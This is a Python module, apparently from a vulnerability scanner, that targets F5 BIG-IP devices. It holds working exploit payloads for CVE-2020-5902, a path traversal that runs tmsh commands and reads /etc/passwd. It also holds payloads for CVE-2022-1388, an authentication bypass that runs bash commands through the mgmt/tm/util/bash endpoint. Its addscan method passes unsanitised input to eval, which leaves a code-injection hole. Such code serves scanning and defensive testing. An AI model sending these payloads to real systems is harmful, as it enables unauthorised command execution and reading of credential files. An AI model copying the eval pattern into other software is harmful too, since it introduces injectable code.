#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    F5-BIG-IP扫描类: 
        1. F5-BIG-IP 远程代码执行
            CVE-2020-5902
                Payload: https://github.com/jas502n/CVE-2020-5902

        2. F5-BIG-IP 身份认证绕过RCE
            CVE-2022-1388
                Payload: http://www.hackdig.com/05/hack-657629.htm

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.thread import thread
from payloads.F5BIGIP.cve_2020_5902 import cve_2020_5902_scan
from payloads.F5BIGIP.cve_2022_1388 import cve_2022_1388_scan

class F5_BIG_IP():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'F5-BIG-IP'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_5902_payloads = [
            {
                'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin',
                'data': ''
            },
            {
                'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx',
                'data': ''
            },
            {
                'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd',
                'data': ''
            },
            {
                'path': 'login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin',
                'data': ''
            },
            {
                'path': 'login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx',
                'data': ''
            },
            {
                'path': 'login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd',
                'data': ''
            },
            # {
            #     'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=C:\Windows\System32\drivers\etc\hosts',
            #     'data': ''
            # },
            # {
            #     'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=C:/Windows/System32/drivers/etc/hosts',
            #     'data': ''
            # }
        ]

        self.cve_2022_1388_payloads = [
            {
                'path': 'mgmt/tm/util/bash',
                'data': '{"command": "run", "utilCmdArgs": "-c \'cat /etc/passwd\'"}'
            },
            {
                'path': 'tm/util/bash',
                'data': '{"command": "run", "utilCmdArgs": "-c \'cat /etc/passwd\'"}'
            },
            {
                'path': 'util/bash',
                'data': '{"command": "run", "utilCmdArgs": "-c \'cat /etc/passwd\'"}'
            }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_5902_scan, url=url),
            thread(target=self.cve_2022_1388_scan, url=url)
        ]

F5_BIG_IP.cve_2020_5902_scan = cve_2020_5902_scan
F5_BIG_IP.cve_2022_1388_scan = cve_2022_1388_scan

f5bigip = F5_BIG_IP()
